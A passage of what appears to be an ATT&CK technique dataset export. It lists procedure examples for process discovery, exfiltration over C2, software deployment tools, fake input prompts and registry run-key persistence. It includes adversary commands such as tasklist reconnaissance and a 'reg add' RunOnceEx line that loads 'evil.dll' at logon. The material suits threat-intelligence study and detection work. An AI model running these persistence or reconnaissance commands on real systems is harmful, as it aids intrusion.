of running processes on the system.', '[WINERACK] can enumerate processes.', '[NETEAGLE] can send process listings over the C2 channel.', '[Tropic Trooper] is capable of enumerating the running processes on the system using <code>pslist</code>.', '[SombRAT] can use the <code>getprocesslist</code> command to enumerate processes on a compromised host.', '[Ryuk] has called <code>CreateToolhelp32Snapshot</code> to enumerate all running processes.', '[JHUHUGIT] obtains a list of running processes on the victim.', '[NKAbuse] will check victim systems to ensure only one copy of the malware is running.', 'During the [SolarWinds Compromise] [APT29] used multiple command-line utilities to enumerate running processes.', '[Bisonal] can obtain a list of running processes on the victim’s machine.', '[ZIPLINE] can identify running processes and their names.', '[Valak] has the ability to enumerate running processes on a compromised host.', '[TSCookie] has the ability to list processes on the infected host.', '[PcShare] can obtain a list of running processes on a compromised host.', '[Ixeshe] can list running processes.', '[Bundlore] has used the <code>ps</code> command to list processes.', ""[Sidewinder] has used tools to identify running processes on the victim's machine."", '[SoreFang] can enumerate processes on a victim machine through use of [Tasklist]', '[Orz] can gather a process list from the victim.', '[Deep Panda] uses the Microsoft [Tasklist] utility to list processes running on systems.', '[Lucifer] can identify the process that owns remote connections.', '[Machete] has a component to check for running processes to look for web browsers. ', '[JPIN] can list running processes.', '[BADHATCH] can retrieve a list of running processes from a compromised machine. ', '[SysUpdate] can collect information about running processes.', '[RCSession] can identify processes based on PID.', '[EKANS] looks for processes from a hard-coded list.', '[BlackEnergy] has gathered a process list by using [Tasklist]', '[Brave Prince] lists the running processes.', '[Fysbis] can collect information about running processes. ', '[Remsec] can obtain a process list from the victim.', '[COATHANGER] will query running process information to determine subsequent program execution flow.', '[Diavol] has used `CreateToolhelp32Snapshot`, `Process32First`, and `Process32Next` API calls to enumerate the running processes in the system.', '[Tasklist] can be used to discover processes running on a system.', '[Caterpillar WebShell] can gather a list of processes running on the machine. ', '[GeminiDuke] collects information on running processes and environment variables from the victim.', '[Astaroth] searches for different processes on the system.', '[Woody RAT] can call `NtQuerySystemProcessInformation` with `SystemProcessInformation` to enumerate all running processes, including associated information such as PID, parent PID, image name, and owner.', '[Bankshot] identifies processes and collects the process ids.', '[APT1] gathered a list of running processes on the system using <code>tasklist /v</code>.', '[metaMain] can enumerate the processes that run on the platform.', '[Zeus Panda] checks for running processes on the victim’s machine.', 'The discovery modules used with [Duqu] can collect information on process details.', '[Comnie] uses the <code>tasklist</code> to view running processes on the victim’s machine.', '[Dacls] can collect data on running and parent processes.', '[POWRUNER] may collect process information by running <code>tasklist</code> on a victim.', '[TAINTEDSCRIBE] can execute <code>ProcessList</code> for process discovery.', '[Ursnif] has gathered information about running processes.', '[Agent Tesla] can list the current running processes on the system.', '[Final1stspy] obtains a list of running processes.', '[Sykipot] may gather a list of running processes by running <code>tasklist /v</code>.', '[Imminent Monitor] has a ""Process Watcher"" feature to monitor processes in case the client ever crashes or gets closed.', '[PowerShower] has the ability to deploy a reconnaissance module to retrieve a list of the active processes.', '[HAFNIUM] has used `tasklist` to enumerate processes.', '[Darkhotel] malware can collect a list of running processes on a system.', '[Elise] enumerates processes via the <code>tasklist</code> command.', '[AppleSeed] can enumerate the current process on a compromised host.', '[Avenger] has the ability to use [Tasklist] to identify running processes.', '[PlugX] has a module to list the processes running on a machine.', '[Seasalt] has a command to perform a process listing.', '[Kasidet] has the ability to search for a given process name in processes currently running in the system.', '[Stealth Falcon] malware gathers a list of running processes.', '[TeamTNT] has searched for rival malware and removes it if found. [TeamTNT] has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.', '[Javali] can monitor processes for open browsers and custom banking applications.', '[Trojan.Karagany] can use [Tasklist] to collect a list of running tasks.', ""An [APT28] loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions."", '[ROKRAT] can list the current running processes on the system.', '[Pasam] creates a backdoor through which remote attackers can retrieve lists of running processes.', '[BabyShark] has executed the <code>tasklist</code> command.\t', '[GravityRAT] lists the running processes on the system.', '[Winnti for Windows] can check if the explorer.exe process is responsible for calling its install function.', '[iKitten] lists the current processes running.', '[P8RAT] can check for specific processes associated with virtual environments.', '[down_new] has the ability to list running processes on a compromised host.', '[Chimera] has used <code>tasklist</code> to enumerate processes.', '[Brute Ratel C4] can enumerate all processes and locate specific process IDs (PIDs).', '[Donut] includes subprojects that enumerate and identify information about [Process Injection] candidates.\t', '[BLACKCOFFEE] has the capability to discover processes.', 'During [C0015] the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes.', '[Avaddon] has collected information about running processes.', '[Helminth] has used [Tasklist] to get information on processes.', '[yty] gets an output of running processes using the <code>tasklist</code> command.', '[Gelsemium] can enumerate running processes.', '[Kazuar] obtains a list of running processes through WMI querying and the <code>ps</code> command.', '[FunnyDream] has the ability to discover processes, including `Bka.exe` and `BkavUtil.exe`.', '[Get2] has the ability to identify running processes on an infected host.', '[HALFBAKED] can obtain information about running processes on the victim.', ""[PowerDuke] has a command to list the victim's processes."", '[KOPILUWAK] can enumerate current running processes on the targeted machine.', '[Andariel] has used <code>tasklist</code> to enumerate processes and find a specific string.', '[BACKSPACE] may collect information about running processes.', '[LookBack] can list running processes.', '[ADVSTORESHELL] can list running processes.', '[RainyDay] can enumerate processes on a target system.', '[ZxShell] has a command, ps, to obtain a listing of processes on the system. ', 'Several [Lazarus Group] malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by [Lazarus Group] also gathers process times.', '[Mafalda] can enumerate running processes on a machine.', '[Carbanak] lists running processes.', '[QakBot] has the ability to check running processes.', ""[FoggyWeb] loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's <code>Microsoft.IdentityServer.ServiceHost.exe</code> process."", '[Bazar] can identity the current process on a compromised host.', '[Molerats] actors obtained a list of active processes on the victim and sent them to C2 servers.', '[Nebulae] can enumerate processes on a target system.', '[Earth Lusca] has used [Tasklist] to obtain information from a compromised host.', '[MobileOrder] has a command to upload information about all running processes to its C2 server.', '[NETWIRE] can discover processes on compromised hosts.', '[Bad Rabbit] can enumerate all running processes to compare hashes.', '[4H RAT] has the capability to obtain a listing of running processes (including loaded modules).', '[KONNI] has used the command <code>cmd /c tasklist</code> to get a snapshot of the current processes on the target machine.', '[FatDuke] can list running processes on the localhost.', '[Heyoka Backdoor] can gather process information.', '[KillDisk] has called <code>GetCurrentProcess</code>.', '[ELMER] is capable of performing process listings.', '[PowerStallion] has been used to monitor process lists.', '[Pandora] can monitor processes on a compromised host.', '[jRAT] can query and kill system processes.', '[DarkComet] can list active processes running on the victim’s machine.', '[TajMahal] has the ability to identify running processes and associated plugins on an infected host.', ""[Clop] can enumerate all processes on the victim's machine."", '[DarkTortilla] can enumerate a list of running processes on a compromised system.', '[Volgmer] can gather a list of processes.', '[Gold Dragon] checks the running processes on the victim’s machine.', '[Industroyer2] has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration.', '[Crimson] contains a command to list processes.\t ', '[RATANKBA] lists the system’s processes.', '[Mustang Panda] has used <code>tasklist /v</code> to determine active process information.\t', '[Pillowmint] can iterate through running processes every six seconds collecting a list of processes to capture from later.\t', '[Rising Sun] can enumerate all running processes and process information on an infected machine.\t', '[Cyclops Blink] can enumerate the process it is currently running under.', '[DarkGate] performs various checks for running processes, including security software by looking for hard-coded process name values. ', '[Skidmap] has monitored critical processes to ensure resiliency. ', '[Ramsay] can gather a list of running processes by using [Tasklist]', '[ToddyCat] has run `cmd /c start /b tasklist` to enumerate processes.', '[PipeMon] can iterate over the running processes to find a suitable injection target.', '[MacMa] can enumerate running processes.', '[PLAINTEE] performs the <code>tasklist</code> command to list running processes.', '[Linfo] creates a backdoor through which remote attackers can retrieve a list of running processes.', '[ShadowPad] has collected the PID of a malicious process.', '[BISCUIT] has a command to enumerate running processes and identify their owners.', '[Mosquito] runs <code>tasklist</code> to obtain running processes.', '[SUNBURST] collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.', 'The OsInfo function in [Komplex] collects a running process list.', '[TrickBot] uses module networkDll for process list discovery.', '[APT5] has used Windows-based utilities to carry out tasks including tasklist.exe. ', 'During [FunnyDream] the threat actors used [Tasklist] on targeted systems.', '[BLUELIGHT] can collect process filenames and SID authority level.', '[Turla] surveys a system upon check-in to discover running processes using the <code>tasklist /v</code> command. [Turla] RPC backdoors have also enumerated processes associated with specific open ports or named pipes.', '[MuddyWater] has used malware to obtain a list of running processes on the system.', '[OceanSalt] can collect the name and ID for every process running on the system.', ""[Rocke] can detect a running process's PID on the infected machine.\t"", '[Magic Hound] malware can list running processes.', '[gh0st RAT] has the capability to list processes.', '[Sardonic] has the ability to execute the `tasklist` command.', '[HotCroissant] has the ability to list running processes on the infected host.', '[CharmPower] has the ability to list running processes through the use of `tasklist`.', '[Hydraq] creates a backdoor through which remote attackers can monitor processes.', '[HELLOKITTY] can search for specific processes to terminate.', '[APT37] Freenki malware lists running processes using the Microsoft Windows API.', '[PoetRAT] has the ability to list all running processes.', '[DRATzarus] can enumerate and examine running processes to determine if a debugger is present.', '[Zox] has the ability to list processes.', '[Mispadu] can enumerate the running processes on a compromised host.', '[MarkiRAT] can search for different processes on a system.', '[Goopy] has checked for the Google Updater process to ensure [Goopy] was loaded properly.', '[Clambling] can enumerate processes on a targeted system.', '[SYSCON] has the ability to use [Tasklist] to list running processes.', '[Backdoor.Oldrea] collects information about running processes.', '[FrameworkPOS] can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.', '[BBSRAT] can list running processes.', '[NavRAT] uses <code>tasklist /v</code> to check running processes.', ""[Kimsuky] can gather a list of all processes running on a victim's machine."", '[XAgentOSX] contains the getProcessList function to run <code>ps aux</code> to get running processes.', '[Saint Bot] has enumerated running processes on a compromised host to determine if it is running under the process name `dfrgui.exe`.', '[Dtrack] dropper can list all running processes.', '[Ninja] can enumerate processes on a targeted host.', '[USBferry] can use <code>tasklist</code> to gather information about the process running on the infected system.\t', '[SocGholish] can list processes on targeted hosts.', '[Kwampirs] collects a list of running services with the command <code>tasklist /v</code>.', '[Bumblebee] can identify processes associated with analytical tools.', '[PowerSploit] <code>Get-ProcessTokenPrivilege</code> Privesc-PowerUp module can enumerate privileges for a given process.', ""[Cuba] can enumerate processes running on a victim's machine."", '[RogueRobin] checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.', '[Proxysvc] lists processes running on the system.', '[NightClub] has the ability to use `GetWindowThreadProcessId` to identify the process behind a specified window.', '[Maze] has gathered all of the running system processes.\t', '[ObliqueRAT] can check for blocklisted process names on a compromised host.', '[SVCReady] can collect a list of running processes from an infected host.', '[Higaisa] shellcode attempted to find the process ID of the current process.', 'After compromising a victim, [Poseidon Group] lists all running processes.', '[Ke3chang] performs process discovery using <code>tasklist</code> commands.', '[ThiefQuest] obtains a list of running processes using the function <code>kill_unwanted</code>.', '[SHOTPUT] has a command to obtain a process listing.', '[SodaMaster] can search a list of running processes.', '[HEXANE] has enumerated processes on targeted systems.', '[SLOTHFULMEDIA] has enumerated processes by ID, name, or privileges. ', '[Babuk] has the ability to check running processes on a targeted system.', '[Inception] has used a reconnaissance module to identify active processes and other associated loaded modules.', '[Taidoor] can use <code>GetCurrentProcessId</code> for process discovery.', '[SDBbot] can enumerate a list of running processes on a compromised machine.', '[POORAIM] can enumerate processes.', '[Akira] verifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items.', '[njRAT] can search a list of running processes for Tr.exe.', '[AsyncRAT] can examine running processes to determine if a debugger is present.', '[FinFisher] checks its parent process for indications that it is running in a sandbox setup.', ""[OilRig] has run <code>tasklist</code> on a victim's machine."", '[Waterbear] can identify the process for a specific security product.', '[SynAck] enumerates all running processes.', '[APT3] has a tool that can list out currently running processes.', ""[RotaJakiro] can monitor the `/proc/[PID]` directory of known [RotaJakiro] processes as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process. [RotaJakiro] processes can be matched to an associated Advisory Lock, in the `/proc/locks` folder, to ensure it doesn't spawn more than one process."", '[Uroburos] can use its `Process List` command to enumerate processes on compromised hosts.', '[PLEAD] has the ability to list processes on the compromised host.', '[StrongPity] can determine if a user is logged in by checking to see if explorer.exe is running.', '[Kinsing] has used ps to list processes.', '[Gamaredon Group] has used tools to enumerate processes on target hosts including Process Explorer.', '[SILENTTRINITY] can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.', 'During [Operation Honeybee] the threat actors obtained a list of running processes on a victim machine using `cmd /c tasklist > %temp%\\temp.ini`.', '[EvilBunny] has used EnumProcesses() to identify how many process are running in the environment.', '[UBoatRAT] can list running processes on the system.', '[Emotet] has been observed enumerating local processes.', 'During [Operation CuckooBees] the threat actors used the `tasklist` command as part of their advanced reconnaissance.', '[Carbon] can list the processes on the victim’s machine.', '[ChChes] collects its process identifier (PID) on the victim.', '[OutSteel] can identify running processes on a compromised host.', '[Winnti Group] looked for a specific process running on infected servers.', '[Lizar] has a plugin designed to obtain a list of processes.', '[Metamorfo] has performed process name checks and has monitored applications. ', '[Conti] can enumerate through all open processes to search for any that have the string “sql” in their process name.', '[InvisiMole] can obtain a list of running processes.', '[Socksbot] can list all running processes.', '[Cobalt Strike] Beacon payload can collect information on process details.', '[Cardinal RAT] contains watchdog functionality that ensures its process is always running, else spawns a new instance.', '[Empire] can find information about processes running on local and remote systems.', '[CaddyWiper] can obtain a list of current processes.', '[Derusbi] collects current and parent process IDs.', ""[Meteor] can check if a specific process is running, such as Kaspersky's `avp.exe`."", '[Royal] can use `GetCurrentProcess` to enumerate processes.', '[RTM] can obtain information about process integrity levels.', '[Flagpro] has been used to run the <code>tasklist</code> command on a compromised system.', '[macOS.OSAMiner] has used `ps ax | grep <name> | grep -v grep | ...` and `ps ax | grep -E...` to conduct process discovery.', '[DustySky] collects information about running processes from victims.', '[APT38] leveraged Sysmon to understand the processes, services in the organization.', '[Azorult] can collect a list of running processes by calling CreateToolhelp32Snapshot.', '[Bonadan] can use the <code>ps</code> command to discover other cryptocurrency miners active on the system.', '[VERMIN] can get a list of the processes and running tasks on the system.', '[ShimRatReporter] listed all running processes on the machine.', '[Carberp] has collected a list of running processes.', '[AvosLocker] has discovered system processes by calling `RmGetList`.', '[Pupy] can list the running processes and get the process ID and parent process’s ID.', '[Doki] has searched for the current process’s PID.', 'During [Operation Wocao] the threat actors used `tasklist` to collect a list of running processes on an infected system.', '[POWERSTATS] has used <code>get_tasklist</code> to discover processes on the compromised host.', '[APT29] has used multiple command-line utilities to enumerate running processes.', '[UNC2452] used multiple command-line utilities to enumerate running processes.', '[Operation Wocao] has collected a list of running processes on the infected system.', '[Frankenstein] has enumerated hosts, looking to obtain a list of all currently running processes.', '[Honeybee] gathers a list of processes using the <code>tasklist</code> command and then is sent back to the control server.', '[Cobalt Strike] ""beacon"" payload can collect information on process details.']",False
T1141,Input Prompt,"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control]  Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as [AppleScript] and [PowerShell]",[],True
T1072,Software Deployment Tools,"Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.    Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.  SaaS-based configuration management services may allow for broad [Cloud Administration Command] on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD. Such services may also utilize [Web Protocols] to communicate back to adversary owned infrastructure.  Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.  The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.","['[APT32] compromised McAfee ePO to move laterally by distributing malware as a software deployment task.', '[Sandworm Team] has used the commercially available tool RemoteExec for agentless remote code execution.', '[Silence] has used RAdmin, a remote software tool used to remotely control workstations and ATMs.', 'It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the [Wiper] malware.', ""[Threat Group-1314] actors used a victim's endpoint management platform, Altiris, for lateral movement."", 'During [C0018] the threat actors used PDQ Deploy to move [AvosLocker] and tools across the network.']",False
T1041,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,"[""[MechaFlounder] has the ability to send the compromised user's account name and hostname within a URL to C2."", '[PoetRAT] has exfiltrated data over the C2 channel.', '[ShimRatReporter] sent generated reports to the C2 via HTTP POST requests.', '[Shark] has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.', '[SLOTHFULMEDIA] has sent system information to a C2 server via HTTP and HTTPS POST requests.', '[OutSteel] can upload files from a compromised host over its C2 channel. ', ""[Bandook] can upload files from a victim's machine over the C2 channel."", '[HotCroissant] has the ability to download files from the infected host to the command and control (C2) server.', '[DnsSystem] can exfiltrate collected data to its C2 server.', '[Machete] collected data is exfiltrated over the same channel used for C2.', '[Bumblebee] can send collected data in JSON format to C2.', '[AppleJeus] has exfiltrated collected host information to a C2 server.', '[NightClub] can use SMTP and DNS for file exfiltration and C2.', '[WarzoneRAT] can send collected victim data to its C2 server.', '[Torisma] can send victim data to an actor-controlled C2 server.', '[SUGARDUMP] has sent stolen credentials and other data to its C2 server.', '[Squirrelwaffle] has exfiltrated victim data using HTTP POST requests to its C2 servers.', '[LuminousMoth] has used malware that exfiltrates stolen data to its C2 server.', '[Sandworm Team] has sent system information to its C2 server using HTTP.\t', '[Chimera] has used [Cobalt Strike] C2 beacons for data exfiltration. ', '[FoggyWeb] can remotely exfiltrate sensitive information from a compromised AD FS server.', '[Carberp] has exfiltrated data via HTTP to already established C2 servers.', '[Misdat] has uploaded files and data to its C2 servers.', '[Woody RAT] can exfiltrate files from an infected machine to its C2 server. ', '[StrongPity] can exfiltrate collected documents through C2 channels.', '[NETEAGLE] is capable of reading files over the C2 channel.', '[GALLIUM] used Web shells and [HTRAN] for C2 and to exfiltrate data.', '[Higaisa] exfiltrated data over its C2 channel.', '[XCSSET] exfiltrates data stolen from a system over its C2 channel.', '[Empire] can send data gathered from a target through the command and control channel.', '[Pupy] can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.', '[LightNeuron] exfiltrates data over its email C2 channel.', '[Grandoreiro] can send data it retrieves to the C2 server.', '[TrickBot] can send information about the compromised host and upload data to a hardcoded C2 server.', '[STARWHALE] can exfiltrate collected data to its C2 servers.', '[BLUELIGHT] has exfiltrated data over its C2 channel.', '[QakBot] can send stolen information to C2 nodes including passwords, accounts, and emails.', '[Ursnif] has used HTTP POSTs to exfil gathered information.', '[Cannon] exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.', '[DarkGate] uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.', '[CharmPower] can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.', ""[Octopus] has uploaded stolen files and data from a victim's machine over its C2 channel."", '[S-Type] has uploaded data and files from a compromised host to its C2 servers.', '[Ke3chang] transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.', '[SVCReady] can send collected data in JSON format to its C2 server. ', '[APT39] has exfiltrated stolen victim data through C2 communications.', '[Metamorfo] can send the data it collects to the C2 server. ', '[REvil] can exfiltrate host and malware information to C2 servers.', '[MobileOrder] exfiltrates data to its C2 server over the same protocol as C2 communications.', '[Emotet] has exfiltrated data over its C2 channel.', '[Lazarus Group] has exfiltrated data and files over a C2 channel through its various tools and malware.', '[Amadey] has sent victim data to its C2 servers.', '[GoldenSpy] has exfiltrated host environment information to an external C2 domain via port 9006.\t', '[DustySky] has exfiltrated data to the C2 server.', '[Zebrocy] has exfiltrated data to the designated C2 server using HTTP POST requests. ', '[Remexi] performs exfiltration over [BITSAdmin] which is also used for the C2 channel.', '[Doki] has used Ngrok to establish C2 and exfiltrate data.', '[Kevin] can send data from the victim host through a DNS C2 channel.', '[IceApple] Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2. ', '[TajMahal] has the ability to send collected files over its C2.', '[AuTo Stealer] can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.', '[APT3] has a tool that exfiltrates data over the C2 channel.', 'During [C0017] [APT41] used its Cloudflare services C2 channels for data exfiltration.', 'During [Operation Honeybee] the threat actors uploaded stolen files to their C2 servers.', '[FunnyDream] can execute commands, including gathering user information, and send the results to C2.', '[APT32] backdoor has exfiltrated data using the already opened channel with its C&C server.', 'During [Operation Dream Job] [Lazarus Group] exfiltrated data from a compromised host to actor-controlled C2 servers.', '[Stuxnet] sends compromised victim information via HTTP.', '[HOPLIGHT] has used its C2 channel to exfiltrate data.\t', 'Data exfiltration is done by [Okrum] using the already opened channel with the C2 server.', '[Astaroth] exfiltrates collected information from its r1.log file to the external C2 server. ', '[Crimson] can exfiltrate stolen information over its C2.', '[HAWKBALL] has sent system information and files over the C2 channel.', '[SharpDisco] can load a plugin to exfiltrate stolen files to SMB shares also used in C2.', '[Lokibot] has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.', '[ROKRAT] can send collected files back over same C2 channel.', '[BoxCaon] uploads files and data from a compromised host over the existing C2 channel.', '[ThiefQuest] exfiltrates targeted file extensions in the <code>/Users/</code> folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.', '[Attor] has exfiltrated data over the C2 channel.', '[Cyclops Blink] has the ability to upload exfiltrated files to a C2 server.', '[EVILNUM] can upload files over the C2 channel from the infected host. ', '[BLINDINGCAN] has sent user and system information to a C2 server via HTTP POST requests.', '[SysUpdate] has exfiltrated data over its C2 channel.', '[MarkiRAT] can exfiltrate locally stored data via its C2.', '[MacMa] exfiltrates data from a supplied path over its C2 channel.', '[Valak] has the ability to exfiltrate data over the C2 channel.', '[PowerShower] has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.', '[StrifeWater] can send data and files from a compromised host to its C2 server.', '[Mafalda] can send network system data and files to its C2 server.', '[Kimsuky] has exfiltrated data over its C2 channel.', 'Adversaries can direct [BACKSPACE] to upload files to the C2 Server.', '[Chrommme] can exfiltrate collected data via C2.', '[Industroyer] sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.', '[SombRAT] has uploaded collected data and files from a compromised host to its C2 server.', '[FlawedAmmyy] has sent data collected from a compromised host to its C2 servers.', '[ZIRCONIUM] has exfiltrated files via the Dropbox API C2.', '[SMOKEDHAM] has exfiltrated data to its C2 server.', '[Flagpro] has exfiltrated data to the C2 server. ', '[AppleSeed] can exfiltrate files via the C2 channel.', '[SILENTTRINITY] can transfer files from an infected host to the C2 server.', '[Drovorub] can exfiltrate files over C2 infrastructure.', '[Caterpillar WebShell] can upload files over the C2 channel. ', '[KOPILUWAK] has exfiltrated collected data to its C2 via POST requests.', 'During [Operation Wocao] threat actors used the XServer backdoor to exfiltrate data.', '[Imminent Monitor] has uploaded a file containing debugger logs, network information and system information to the C2.', '[Psylo] exfiltrates data to its C2 server over the same protocol as C2 communications.', '[Pteranodon] exfiltrates screenshot files to its C2 server.', '[Kessel] has exfiltrated information gathered from the infected system to the C2 server.', '[metaMain] can upload collected files and data to its C2 server.', '[SideTwist] has exfiltrated data over its C2 channel.', '[SDBbot] has sent collected data from a compromised host to its C2 servers.', '[Confucius] has exfiltrated stolen files to its C2 server.', ' [Bisonal] has added the exfiltrated data to the URL over the C2 channel. ', '[Rising Sun] can send data gathered from the infected machine via HTTP POST request to the C2.\t', '[njRAT] has used HTTP to receive stolen information from the infected machine.\t', '[KGH_SPY] can exfiltrate collected information from the host to the C2 server.', '[Mongall] can upload files and information from a compromised host to its C2 server.', '[Mispadu] can sends the collected financial data to the C2 server.', '[Wizard Spider] has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.', '[Proxysvc] performs data exfiltration over the control server channel using a custom protocol.', '[KONNI] has sent data and files to its C2 server.', '[Sliver] can exfiltrate files from the victim using the <code>download</code> command.', '[PcShare] can upload files and information from a compromised host to its C2 servers.', ' [Tomiris] can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.', '[Penquin] can execute the command code <code>do_upload</code> to send files to C2.', '[CreepySnail] can connect to C2 for data exfiltration.', '[Bankshot] exfiltrates data over its C2 channel.', ""During [Frankenstein] the threat actors collected information via [Empire] which sent the data back to the adversary's C2."", '[Leviathan] has exfiltrated data over its C2 channel.', '[Mis-Type] has transmitted collected files and data to its C2 server.', '[RDAT] can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.', 'A [Gamaredon Group] file stealer can transfer collected files to a hardcoded C2 server.', '[LitePower] can send collected data, including screenshots, over its C2 channel.', '[Spark] has exfiltrated data over the C2 channel. ', '[ADVSTORESHELL] exfiltrates data over the same channel used for C2.', '[Goopy] has the ability to exfiltrate data over the Microsoft Outlook C2 channel.', '[CallMe] exfiltrates data to its C2 server over the same protocol as C2 communications.', '[GoldMax] can exfiltrate files over the existing C2 channel.', '[MuddyWater] has used C2 infrastructure to receive exfiltrated data.', 'After data is collected by [Stealth Falcon] malware, it is exfiltrated over the existing C2 channel.', '[Ebury] can exfiltrate SSH credentials through custom DNS queries.', '[ZLib] has sent data and files from a compromised host to its C2 servers.', '[Dyre] has the ability to send information staged on a compromised host externally to C2.', '[RotaJakiro] sends device and other collected data back to the C2 using the established C2 channels over TCP. ', '[GrimAgent] has sent data related to a compromise host over its C2 channel.', '[BADHATCH] can exfiltrate data over the C2 channel. ', '[PingPull] has the ability to exfiltrate stolen victim data through its C2 channel.', '[Crutch] can exfiltrate data over the primary C2 channel (Dropbox HTTP API).', ""[OopsIE] can upload files from the victim's machine to its C2 server."", ""[Frankenstein] has collected information via [Empire] which is automatically sent the data back to the adversary's C2."", '[Operation Wocao] has used the Xserver backdoor to exfiltrate data.']",False
T1591,Gather Victim Org Information,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Phishing] or [Trusted Relationship]","['[Lazarus Group] has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.', 'For [Operation Dream Job] [Lazarus Group] gathered victim organization information to identify specific targets.', '[Kimsuky] has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.']",
T1060,Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.  Placing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.  The startup folder path for the current user is: * <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> The startup folder path for all users is: * <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>  The following run keys are created by default on Windows systems: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code>   The following Registry keys can be used to set startup folder items for persistence: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>  The following Registry keys can control automatic startup of services during boot: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys: * 